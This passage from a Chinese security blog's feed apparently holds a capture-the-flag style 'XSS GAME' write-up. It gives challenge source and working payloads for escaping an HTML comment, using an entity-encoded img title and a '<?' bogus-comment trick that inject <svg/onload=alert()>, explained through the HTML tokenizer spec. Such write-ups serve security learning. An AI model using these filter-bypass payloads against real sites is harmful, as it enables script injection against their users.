href="http://www.thespanner.co.uk/2013/05/16/dom-clobbering/" target="_blank" rel="noopener">DOM Clobbering</a></p><p><a href="https://medium.com/@terjanq/dom-clobbering-techniques-8443547ebe94" target="_blank" rel="noopener">Clobbering the clobbered &#x2014; Advanced DOM Clobbering</a></p><p><a href="https://research.securitum.com/xss-in-amp4email-dom-clobbering/" target="_blank" rel="noopener">XSS in GMail&#x2019;s AMP4Email via DOM Clobbering</a></p><p>[DOM Clobbering Attack&#x5B66;&#x4E60;&#x8BB0;&#x5F55;.md](<a href="https://wonderkun.cc/2020/02/15/DOM" target="_blank" rel="noopener">https://wonderkun.cc/2020/02/15/DOM</a> Clobbering Attack&#x5B66;&#x4E60;&#x8BB0;&#x5F55;)</p><p><a href="https://cure53.de/dom" target="_blank" rel="noopener">Im DOM h&#xF6;rt Dich keiner schreien</a></p><p><a href="https://fastmail.blog/2015/12/20/sanitising-html-the-dom-clobbering-issue/" target="_blank" rel="noopener">Dec 20: Sanitising HTML &#x2013; the DOM clobbering issue</a></p><p><a href="https://juejin.im/post/5abb99e9f265da2392366824" target="_blank" rel="noopener">&#x8C08;&#x8C08; JavaScript &#x7684;&#x4F5C;&#x7528;&#x57DF;</a></p></body></html>]]></content>
        <author>
            <name><![CDATA[Zeddâ€™s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.zeddyu.info/2020/02/11/xssgame/</id>
        <title><![CDATA[XSS GAME]]></title>
        <updated>2020-05-05T17:31:59+08:00</updated>
        <link href="https://blog.zeddyu.info/2020/02/11/xssgame/"/>
        <content type="text/html" src="https://blog.zeddyu.info/2020/02/11/xssgame/"><![CDATA[<html><head></head><body><p>&#x8FC7;&#x5E74;&#x671F;&#x95F4;&#x73A9;&#x4E86;&#x4E00;&#x4E0B;&#x56FD;&#x5916;&#x7684;&#x4E00;&#x4E2A; XSS GAME&#xFF0C;&#x6536;&#x83B7;&#x9887;&#x4E30;&#xFF0C;&#x8BB0;&#x5F55;&#x4E00;&#x4E0B;&#x5B66;&#x4E60;&#x8FC7;&#x7A0B;&#x3002;&#x672C;&#x4EBA;&#x5BF9;&#x4E8E; JavaScript &#x4EE5;&#x53CA;&#x524D;&#x7AEF;&#x7684;&#x7406;&#x89E3;&#x4E0D;&#x6DF1;&#xFF0C;&#x6C34;&#x5E73;&#x4E5F;&#x4E0D;&#x9AD8;&#xFF0C;&#x5982;&#x679C;&#x6587;&#x7AE0;&#x6709;&#x758F;&#x6F0F;&#x4E4B;&#x5904;&#xFF0C;&#x8FD8;&#x8BF7;&#x5E08;&#x5085;&#x4EEC;&#x65A7;&#x6B63;&#x3002;</p><blockquote class="colorquote success"><p>&#x6587;&#x7AE0;&#x9996;&#x53D1;&#x4E8E;&#x5B89;&#x5168;&#x5BA2;&#xFF1A;<a href="https://www.anquanke.com/post/id/198496" target="_blank" rel="noopener">https://www.anquanke.com/post/id/198496</a></p></blockquote><a id="more"></a><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>&#x6240;&#x6709;&#x9898;&#x76EE;&#x7684;&#x76EE;&#x6807;&#x90FD;&#x662F;&#x5B9E;&#x73B0;<code>alert(1337)</code>&#x5373;&#x53EF;&#xFF0C;&#x6709;&#x7740;&#x4E0D;&#x540C;&#x7684;&#x96BE;&#x5EA6;</p><h2 id="Area-51"><a href="#Area-51" class="headerlink" title="Area 51"></a>Area 51</h2><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">&lt;!-- Challenge --&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;pwnme&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">var</span> input = (<span class="hljs-keyword">new</span> URL(location).searchParams.get(<span class="hljs-string">&apos;debug&apos;</span>) || <span class="hljs-string">&apos;&apos;</span>).replace(<span class="hljs-regexp">/[\!\-\/\#\&amp;\;\%]/g</span>, <span class="hljs-string">&apos;_&apos;</span>);</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">var</span> template = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&apos;template&apos;</span>);</span></span><br><span class="line">    template.innerHTML = input;</span><br><span class="line"><span class="hljs-handlebars"><span class="hljs-xml">    pwnme.innerHTML = &quot;<span class="hljs-comment">&lt;!-- &lt;p&gt; DE<span class="hljs-doctag">BUG:</span> &quot; + template.outerHTML + &quot; &lt;/p&gt; --&gt;</span>&quot;;</span></span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x9898;&#x76EE;&#x6E90;&#x4EE3;&#x7801;&#x5982;&#x4E0A;&#xFF0C;&#x9898;&#x76EE;&#x4EE3;&#x7801;&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#xFF0C;&#x9996;&#x5148;&#x5BF9;&#x7528;&#x6237;&#x4F20;&#x5165;&#x7684; debug &#x53C2;&#x6570;&#x8FDB;&#x884C;&#x5173;&#x952E;&#x5B57;&#x8FC7;&#x6EE4;&#x8F6C;&#x6362;&#xFF0C;&#x5BF9;&#x4E8E;<code>!-/#&amp;;%</code>&#x7B26;&#x53F7;&#x90FD;&#x4F1A;&#x88AB;&#x4E0B;&#x5212;&#x7EBF;&#x66FF;&#x4EE3;&#xFF0C;&#x7136;&#x540E;&#x521B;&#x5EFA;&#x4E00;&#x4E2A; template &#x6807;&#x7B7E;&#xFF0C;&#x6807;&#x7B7E;&#x7684; HTML &#x5185;&#x5BB9;&#x4E3A;&#x6211;&#x4EEC;&#x4F20;&#x5165;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x6700;&#x540E;&#x5728;&#x4E00;&#x4E2A; div &#x4E2D;&#xFF0C;&#x628A;&#x6784;&#x5EFA;&#x597D;&#x7684; template &#x6807;&#x7B7E;&#x8F93;&#x51FA;&#x5728;&#x4E00;&#x4E2A;&#x6CE8;&#x91CA;&#x5F53;&#x4E2D;&#x3002;</p><p>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x7684;&#x4E3B;&#x8981;&#x5F97;&#x7ED5;&#x8FC7;&#x6CE8;&#x91CA;&#x7B26;&#x7684;&#x9650;&#x5236;&#xFF0C;&#x7531;&#x4E8E;<code>&lt;!--</code>&#x662F;&#x591A;&#x884C;&#x6CE8;&#x91CA;&#xFF0C;&#x6240;&#x4EE5;&#x6362;&#x884C;&#x7684;&#x601D;&#x8DEF;&#x6211;&#x4EEC;&#x57FA;&#x672C;&#x4E0D;&#x53EF;&#x884C;&#xFF0C;&#x5373;&#x4F7F;&#x6CA1;&#x6709;&#x628A;<code>--</code>&#x8FC7;&#x6EE4;&#xFF0C;JS&#x4E5F;&#x4F1A;&#x5728;&#x7B2C;&#x4E00;&#x6B65;<code>template.innerHTML</code>&#x5C06;&#x6211;&#x4EEC;&#x7684;<code>--&gt;</code>&#x4E2D;&#x7684;<code>&gt;</code>&#x8FDB;&#x884C;&#x8F6C;&#x4E49;&#x3002;&#x6240;&#x4EE5;&#x57FA;&#x672C;&#x4E0A;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x201C;&#x76F4;&#x63A5;&#x201C;&#x95ED;&#x5408;&#x7684;&#x601D;&#x8DEF;&#x662F;&#x884C;&#x4E0D;&#x901A;&#x7684;&#x3002;</p><p>&#x9996;&#x5148;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x77E5;&#x9053; HTML &#x89E3;&#x6790;&#x987A;&#x5E8F;&#xFF0C;&#x9996;&#x5148;&#x5148;&#x89E3;&#x6790; HTML &#x90E8;&#x5206;&#x4EE3;&#x7801;&#xFF0C;&#x518D;&#x7528; JS &#x89E3;&#x91CA;&#x5668; JS &#x4EE3;&#x7801;&#xFF0C;JS&#x89E3;&#x91CA;&#x5668;&#x4F1A;&#x8FB9;&#x89E3;&#x91CA;&#x8FB9;&#x6267;&#x884C;&#xFF0C;&#x5BF9;&#x4E8E; innerHTML &#x4F1A;&#x4F7F;&#x7528; HTML parser &#x89E3;&#x6790;&#x5176;&#x4E2D;&#x7684;&#x4EE3;&#x7801;&#x3002;&#x672C;&#x9898;&#x4F1A;&#x5229;&#x7528;&#x5230;&#x4E00;&#x4E9B; HTML parser &#x7684;&#x77E5;&#x8BC6;&#xFF0C;&#x5EFA;&#x8BAE;&#x914D;&#x5408; W3 &#x6587;&#x6863; <a href="https://www.w3.org/TR/html52/syntax.html" target="_blank" rel="noopener">The HTML syntax</a>&#xFF0C;&#x4E0D;&#x60F3;&#x770B;&#x82F1;&#x6587;&#x7684;&#x8BDD;&#x4E5F;&#x53EF;&#x4EE5;&#x51D1;&#x5408;&#x51D1;&#x5408;&#x770B;&#x770B;&#x672C;&#x83DC;&#x4E4B;&#x524D;&#x5199;&#x7684; <a href="https://blog.zeddyu.info/2019/03/13/Web&#x5B89;&#x5168;&#x4ECE;&#x96F6;&#x5F00;&#x59CB;-XSS-I/#Encode">&#x5173;&#x4E8E; HTML &#x7F16;&#x7801;</a> &#x7684;&#x6C34;&#x6587;&#x3002;</p><h3 id="Easy-Version"><a href="#Easy-Version" class="headerlink" title="Easy Version"></a>Easy Version</h3><p>&#x6211;&#x4EEC;&#x5148;&#x6765;&#x770B;&#x770B;&#x7B2C;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x7248;&#x672C;&#xFF0C;&#x5F53;&#x65F6;&#x7531;&#x4E8E;&#x51FA;&#x9898;&#x8005;&#x6BD4;&#x8F83;&#x758F;&#x5FFD;&#xFF0C;&#x5E76;&#x6CA1;&#x6709;&#x8FC7;&#x6EE4;<code>&amp;#;</code>&#xFF0C;&#x5BFC;&#x81F4;&#x4E86;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x7528; HTML &#x5B9E;&#x4F53;&#x7F16;&#x7801;&#x8FDB;&#x884C;&#x7ED5;&#x8FC7;&#xFF0C;&#x76F4;&#x63A5;&#x95ED;&#x5408;&#x6CE8;&#x91CA;&#x8FDB;&#x800C;&#x5B9E;&#x73B0; alert &#xFF0C;&#x4F8B;&#x5982;&#xFF0C;&#x5728;&#x6CA1;&#x6709;&#x8FC7;&#x6EE4;<code>&amp;#;</code>&#x7684;&#x60C5;&#x51B5;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x8FD9;&#x4E48;&#x505A;&#xFF1A;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">title</span>=<span class="hljs-string">&quot;<span class="hljs-symbol">&amp;#x2D;</span><span class="hljs-symbol">&amp;#x2D;</span><span class="hljs-symbol">&amp;#x3E;</span><span class="hljs-symbol">&amp;#x3C;</span><span class="hljs-symbol">&amp;#x73;</span><span class="hljs-symbol">&amp;#x76;</span><span class="hljs-symbol">&amp;#x67;</span><span class="hljs-symbol">&amp;#x2F;</span><span class="hljs-symbol">&amp;#x6F;</span><span class="hljs-symbol">&amp;#x6E;</span><span class="hljs-symbol">&amp;#x6C;</span><span class="hljs-symbol">&amp;#x6F;</span><span class="hljs-symbol">&amp;#x61;</span><span class="hljs-symbol">&amp;#x64;</span><span class="hljs-symbol">&amp;#x3D;</span><span class="hljs-symbol">&amp;#x61;</span><span class="hljs-symbol">&amp;#x6C;</span><span class="hljs-symbol">&amp;#x65;</span><span class="hljs-symbol">&amp;#x72;</span><span class="hljs-symbol">&amp;#x74;</span><span class="hljs-symbol">&amp;#x28;</span><span class="hljs-symbol">&amp;#x29;</span><span class="hljs-symbol">&amp;#x3E;</span>&quot;</span>&gt;</span>1</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4F7F;&#x7528; HTML &#x7F16;&#x7801;&#x5C06;&#x6211;&#x4EEC;&#x7684; payload &#x8FDB;&#x884C;&#x7F16;&#x7801;&#x7ED5;&#x8FC7;</p><p></p><figure class="highlight xml hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--&gt;<span class="hljs-tag">&lt;<span class="hljs-name">svg</span>/<span class="hljs-attr">onload</span>=<span class="hljs-string">alert()</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200131165018.png" alt></p><p>&#x4F46;&#x662F;&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x5E76;&#x4E0D;&#x80FD;&#x76F4;&#x63A5;&#x4F20;&#x5165; HTML &#x7F16;&#x7801;&#x7ED5;&#x8FC7;&#xFF0C;&#x5F97;&#x9700;&#x8981;&#x52A0;&#x4E00;&#x4E2A; img &#x6807;&#x7B7E;&#x5229;&#x7528;&#x5176;&#x5C5E;&#x6027;&#x8FDB;&#x884C;&#x7ED5;&#x8FC7;&#xFF0C;&#x4E3A;&#x4EC0;&#x4E48;&#x5462;&#xFF1F;</p><p>&#x56E0;&#x4E3A;&#x8FD9;&#x91CC;&#x5176;&#x5B9E;&#x6709;&#x4E24;&#x6B21; HTML &#x89E3;&#x7801;&#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x7B2C;&#x4E00;&#x4E2A;&#x662F;<code>template.innerHTML</code>&#xFF0C;&#x7B2C;&#x4E8C;&#x4E2A;&#x662F;<code>pwnme.innerHTML</code>&#xFF0C;&#x7B2C;&#x4E00;&#x4E2A;&#x89E3;&#x7801;&#x64CD;&#x4F5C;&#x4F1A;&#x76F4;&#x63A5;&#x628A;&#x6211;&#x4EEC;&#x4F20;&#x5165;&#x7684;&#x53C2;&#x6570;&#x8FDB;&#x884C;&#x89E3;&#x7801;&#xFF0C;&#x5E76;&#x4E14;&#x5BF9;&#x5176;&#x4E2D;&#x7684;<code>&lt;&gt;</code>&#x8FDB;&#x884C;&#x8F6C;&#x4E49;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#xFF0C;&#x5B9E;&#x9645;&#x4E0A;&#x7B2C;&#x4E00;&#x4E2A;&#x5F97;&#x5230;&#x7684;&#x662F;&#x5982;&#x4E0B;&#x5185;&#x5BB9;&#xFF1A;</p><p></p><figure class="highlight xml hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--<span class="hljs-symbol">&amp;gt;</span><span class="hljs-symbol">&amp;lt;</span>svg/onload=alert()<span class="hljs-symbol">&amp;gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5728;&#x7B2C;&#x4E8C;&#x6B65;&#x6E32;&#x67D3;&#x7684;&#x65F6;&#x5019;&#x5C31;&#x81EA;&#x7136;&#x4E0D;&#x53EF;&#x80FD;&#x95ED;&#x5408;&#x6CE8;&#x91CA;&#x4E86;&#xFF0C;&#x53EA;&#x80FD;&#x5F97;&#x5230;&#x5982;&#x4E0B;&#x4EE3;&#x7801;&#xFF1A;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">&lt;!-- &lt;p&gt; DE<span class="hljs-doctag">BUG:</span> &lt;template&gt;--&amp;gt;&amp;lt;svg/onload=alert()&amp;gt;&lt;/template&gt; &lt;/p&gt; --&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6240;&#x4EE5;&#x5F53;&#x6211;&#x4EEC;&#x501F;&#x52A9; img &#x5C5E;&#x6027;&#x8FDB;&#x884C;&#x7ED5;&#x8FC7;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x7B2C;&#x4E00;&#x6B65;&#x5F97;&#x5230;&#x7684;&#x5B9E;&#x9645;&#x4E0A;&#x662F;&#xFF1A;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">title</span>=<span class="hljs-string">&quot;--&gt;&lt;svg/onload=alert()&gt;&quot;</span>&gt;</span>1</span><br></pre></td></tr></tbody></table></figure><p></p><p>HTML parser&#x4E0D;&#x4F1A;&#x5C06; title &#x5C5E;&#x6027;&#x5185;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x8FDB;&#x884C;&#x8F6C;&#x4E49;&#xFF0C;&#x6240;&#x4EE5;&#x7B2C;&#x4E8C;&#x6B65;&#x5F53;&#x76F4;&#x63A5;&#x8F93;&#x51FA;&#x5230;&#x9875;&#x9762;&#x7684;&#x65F6;&#x5019;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">&lt;!-- &lt;p&gt; DE<span class="hljs-doctag">BUG:</span> &lt;template&gt;&lt;img title=&quot;--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;alert()&quot;</span>&gt;</span>&quot;<span class="hljs-symbol">&amp;gt;</span>1 <span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span> --<span class="hljs-symbol">&amp;gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x7136;&#x540E;&#x5F53; HTML parser &#x89E3;&#x6790;&#x8FD9;&#x6BB5;&#x4EE3;&#x7801;&#x65F6;&#xFF0C;&#x9996;&#x5148;&#x7531;<code>&lt;!</code>&#x7684;&#x5B58;&#x5728;&#xFF0C;&#x4F1A;&#x8FDB;&#x5165;<a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-markup-declaration-open-state" target="_blank" rel="noopener">Markup declaration open state</a>&#xFF0C;&#x4E2D;&#x95F4;&#x7684;&#x4EE3;&#x7801;<code>&lt;p&gt; DEBUG: &lt;template&gt;&lt;img title=&quot;</code>&#x4F1A;&#x8BA9; HTML parser &#x8FDB;&#x5165;&#x4E00;&#x4E9B;&#x5176;&#x4ED6;&#x5173;&#x4E8E; comment &#x7684;&#x72B6;&#x6001;&#xFF0C;&#x8FD9;&#x4E9B;&#x90FD;&#x65E0;&#x5173;&#x7D27;&#x8981;&#xFF0C;&#x6700;&#x540E;&#x7684;<code>--&gt;</code>&#x8BA9; HTML parser &#x8FDB;&#x5165;&#x5230;&#x4E86;<a href="https://www.w3.org/TR/html52/syntax.html#comment-end-state" target="_blank" rel="noopener">Comment End State</a>&#xFF0C;&#x6839;&#x636E; W3 &#x6587;&#x6863;&#xFF1A;</p><blockquote><p>Comment end state</p><p>Consume the <a href="https://www.w3.org/TR/html52/syntax.html#next-input-character" target="_blank" rel="noopener">next input character</a>:</p><ul><li><p>U+003E GREATER-THAN SIGN (&gt;)</p><p>Switch to the <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-data-state" target="_blank" rel="noopener">data state</a>. Emit the comment token.</p></li></ul></blockquote><p>&#x63A5;&#x7740;&#x6211;&#x4EEC;&#x5C31;&#x8FDB;&#x5165;&#x5230;&#x4E86; <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-data-state" target="_blank" rel="noopener">data state</a>&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x7ED3;&#x675F;&#x4E86;&#x6CE8;&#x91CA;&#x89E3;&#x6790;&#x72B6;&#x6001;&#x56DE;&#x5230;&#x4E86;&#x6700;&#x5F00;&#x59CB;&#x7684; HTML &#x89E3;&#x6790;&#x72B6;&#x6001;&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x5BFC;&#x81F4;&#x6211;&#x4EEC;&#x5C31;&#x6210;&#x529F;&#x9003;&#x9038;&#x4E86;&#x6CE8;&#x91CA;&#x7B26;&#x3002;</p><h3 id="Difficult-Version"><a href="#Difficult-Version" class="headerlink" title="Difficult Version"></a>Difficult Version</h3><p>&#x518D;&#x8FC7;&#x6EE4;&#x4E86;&#x5B9E;&#x4F53;&#x7F16;&#x7801;<code>&amp;#;</code>&#x4E4B;&#x540E;&#x6211;&#x4EEC;&#x8981;&#x600E;&#x4E48;&#x7ED5;&#x8FC7;&#x5462;&#xFF1F;&#x6211;&#x4EEC;&#x5148;&#x7ED9;&#x51FA;&#x4E00;&#x4E2A; Trick &#xFF0C;&#x5728;&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;<code>&lt;?</code>&#x8FDB;&#x884C;&#x7ED5;&#x8FC7;&#x3002;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200131165157.png" alt></p><p>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x6211;&#x4EEC;&#x5728;&#x4F7F;&#x7528;&#x4E86;<code>&lt;?</code>&#x4E4B;&#x540E;&#x6210;&#x529F;&#x628A; p &#x6807;&#x7B7E;&#x9003;&#x9038;&#x4E86;&#x51FA;&#x6765;&#xFF0C;&#x53EF;&#x662F;&#x4E3A;&#x4EC0;&#x4E48;&#x5462;&#xFF1F;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x8F93;&#x51FA;&#x7B2C;&#x4E00;&#x6B65;&#x7684;<code>template.innerHTML</code>&#x770B;&#x770B;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200131165902.png" alt></p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#x5728;&#x7B2C;&#x4E00;&#x6B65;&#x6E32;&#x67D3;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4F20;&#x5165;&#x7684;<code>&lt;?</code>&#x5DF2;&#x7ECF;&#x53D8;&#x6210;&#x4E86;<code>&lt;!--?--&gt;</code>&#xFF0C;&#x5B58;&#x5728;<code>--&gt;</code>&#x53EF;&#x4EE5;&#x5C06;&#x6CE8;&#x91CA;&#x95ED;&#x5408;&#x3002;&#x53EF;&#x662F;&#x8FD9;&#x662F;&#x4E3A;&#x4EC0;&#x4E48;&#x5462;&#xFF1F;</p><p>&#x5728;<code>template.innerHTML = input</code>&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4F1A;&#x89E3;&#x6790;<code>input</code>&#xFF0C;&#x7136;&#x540E;&#x4F7F;&#x7528; HTML parser &#x89E3;&#x6790;&#xFF0C;&#x6839;&#x636E; W3 &#x6587;&#x6863;</p><blockquote><p>&#x200B;    Implementations must act as if they used the following state machine to tokenize HTML. The state machine must start in the <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-data-state" target="_blank" rel="noopener">data state</a>.</p></blockquote><p>&#x89E3;&#x6790;&#x5230;<code>&lt;</code>&#x7684;&#x65F6;&#x5019;&#xFF0C;HTML parser &#x6B63;&#x5904;&#x4E8E; <a href="https://www.w3.org/TR/html52/syntax.html#data-state" target="_blank" rel="noopener">data state</a></p><blockquote><p>Data state</p><p>Consume the <a href="https://www.w3.org/TR/html52/syntax.html#next-input-character" target="_blank" rel="noopener">next input character</a>:</p><ul><li><p>U+0026 AMPERSAND (&amp;)</p><p>Set the <a href="https://www.w3.org/TR/html52/syntax.html#return-state" target="_blank" rel="noopener">return state</a> to the <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-data-state" target="_blank" rel="noopener">data state</a>. Switch to the <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-character-reference-state" target="_blank" rel="noopener">character reference state</a>.</p></li><li><p>U+003C LESS-THAN SIGN (&lt;)</p><p>Switch to the <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-tag-open-state" target="_blank" rel="noopener">tag open state</a>.</p></li><li><p>U+0000 NULL</p><p><a href="https://www.w3.org/TR/html52/syntax.html#parse-errors" target="_blank" rel="noopener">Parse error</a>. Emit the <a href="https://www.w3.org/TR/html52/syntax.html#current-input-character" target="_blank" rel="noopener">current input character</a> as a character token.</p></li><li><p>EOF</p><p>Emit an end-of-file token.</p></li><li><p>Anything else</p><p>Emit the <a href="https://www.w3.org/TR/html52/syntax.html#current-input-character" target="_blank" rel="noopener">current input character</a> as a character token.</p></li></ul></blockquote><p>&#x4E8E;&#x662F;&#x8FDB;&#x5165; <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-tag-open-state" target="_blank" rel="noopener">tag open state</a></p><blockquote><p>Tag open state</p><p>Consume the <a href="https://www.w3.org/TR/html52/syntax.html#next-input-character" target="_blank" rel="noopener">next input character</a>:</p><ul><li><p>U+0021 EXCLAMATION MARK (!)</p><p>Switch to the <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-markup-declaration-open-state" target="_blank" rel="noopener">markup declaration open state</a>.</p></li><li><p>U+002F SOLIDUS (/)</p><p>Switch to the <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-end-tag-open-state" target="_blank" rel="noopener">end tag open state</a>.</p></li><li><p><a href="https://www.w3.org/TR/html52/infrastructure.html#ascii-letters" target="_blank" rel="noopener">ASCII letter</a></p><p>Create a new start tag token, set its tag name to the empty string. <a href="https://www.w3.org/TR/html52/syntax.html#reconsume" target="_blank" rel="noopener">Reconsume</a> in the <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-tag-name-state" target="_blank" rel="noopener">tag name state</a>.</p></li><li><p>U+003F QUESTION MARK (?)</p><p><a href="https://www.w3.org/TR/html52/syntax.html#parse-errors" target="_blank" rel="noopener">Parse error</a>. Create a comment token whose data is the empty string. <a href="https://www.w3.org/TR/html52/syntax.html#reconsume" target="_blank" rel="noopener">Reconsume</a> in the <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-bogus-comment-state" target="_blank" rel="noopener">bogus comment state</a>.</p></li><li><p>Anything else</p><p><a href="https://www.w3.org/TR/html52/syntax.html#parse-errors" target="_blank" rel="noopener">Parse error</a>. Emit a U+003C LESS-THAN SIGN character token. <a href="https://www.w3.org/TR/html52/syntax.html#reconsume" target="_blank" rel="noopener">Reconsume</a> in the <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-data-state" target="_blank" rel="noopener">data state</a>.</p></li></ul></blockquote><p>&#x4E0B;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#x662F;<code>?</code>&#xFF0C;&#x6839;&#x636E;&#x6587;&#x6863;&#xFF0C;HTML parser &#x4F1A;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x7A7A;&#x7684; comment token&#xFF0C;&#x8FDB;&#x5165; <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-bogus-comment-state" target="_blank" rel="noopener">bogus comment state</a>&#xFF0C;</p><blockquote><p>Bogus comment state</p><p>Consume the <a href="https://www.w3.org/TR/html52/syntax.html#next-input-character" target="_blank" rel="noopener">next input character</a>:</p><ul><li><p>U+003E GREATER-THAN SIGN (&gt;)</p><p>Switch to the <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-data-state" target="_blank" rel="noopener">data state</a>. Emit the comment token.</p></li><li><p>EOF</p><p>Emit the comment. Emit an end-of-file token.</p></li><li><p>U+0000 NULL</p><p>Append a U+FFFD REPLACEMENT CHARACTER character to the comment token&#x2019;s data.</p></li><li><p>Anything else</p><p>Append the <a href="https://www.w3.org/TR/html52/syntax.html#current-input-character" target="_blank" rel="noopener">current input character</a> to the comment token&#x2019;s data.</p></li></ul></blockquote><p>&#x4E0B;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#x662F; anything else&#xFF0C;&#x4F1A;&#x5C06;&#x8FD9;&#x4E2A;&#x5B57;&#x7B26;&#x63D2;&#x5165;&#x5230;&#x521A;&#x521A;&#x7684; comment &#x4E2D;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x6211;&#x4EEC;&#x4E0A;&#x56FE;&#x770B;&#x5230;&#x7684;<code>&lt;!--?--&gt;</code>&#xFF0C;&#x4F8B;&#x5982;&#x8F93;&#x5165;&#x662F;<code>aaa&lt;?bbb&gt;ccc</code>&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x89E3;&#x6790;&#x5230;&#x7B2C; i &#x4E2A;&#x5B57;&#x7B26;&#x65F6;&#xFF0C;innerHTML &#x7684;&#x7ED3;&#x679C;&#x662F;&#x8FD9;&#x6837;&#x7684;&#xFF1A;</p><p></p><figure class="highlight django hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-xml">a</span></span><br><span class="line"><span class="hljs-xml">aa</span></span><br><span class="line"><span class="hljs-xml">aaa</span></span><br><span class="line"><span class="hljs-xml">aaa<span class="hljs-tag">&lt;</span></span></span><br><span class="line"><span class="hljs-xml">aaa<span class="hljs-comment">&lt;!--?--&gt;</span></span></span><br><span class="line"><span class="hljs-xml">aaa<span class="hljs-comment">&lt;!--?b--&gt;</span></span></span><br><span class="line"><span class="hljs-xml">aaa<span class="hljs-comment">&lt;!--?bb--&gt;</span></span></span><br><span class="line"><span 